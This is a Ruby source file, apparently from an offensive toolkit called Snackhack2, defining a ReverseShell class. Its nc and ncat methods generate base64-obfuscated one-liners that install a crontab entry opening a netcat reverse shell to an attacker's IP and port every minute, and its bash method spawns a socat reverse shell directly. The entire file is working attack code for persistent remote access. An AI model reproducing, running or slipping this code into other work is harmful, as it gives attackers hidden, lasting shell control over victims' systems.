# frozen_string_literal: true

require 'base64'
module Snackhack2
  class ReverseShell
    attr_accessor :ip, :port

    def initialize()
      @ip   = ip
      @port = port
    end

    def nc
      c = %{#!/bin/bash
			line="* * * * * nc -e /bin/sh #{@ip} #{@port}"
			(crontab -u $(whoami) -l; echo "$line" ) | crontab -u $(whoami) -}
      puts "echo -n '#{Base64.encode64(c)}' | base64 -d >> t.sh; bash t.sh; rm t.sh;".delete!("\n")
    end

    def ncat
      c = %{#!/bin/bash
			line="* * * * * ncat #{@ip} #{@port} -e /bin/bash"
			(crontab -u $(whoami) -l; echo "$line" ) | crontab -u $(whoami) -}
      puts "echo -n '#{Base64.encode64(c)}' | base64 -d >> t.sh; bash t.sh; rm t.sh;".delete!("\n")
    end

    def bash
      c = %(bash.exe -c "socat tcp-connect:#{@ip}:#{@port} exec:sh,pty,stderr,setsid,sigint,sane")
      Process.spawn(c)
    end
  end
end
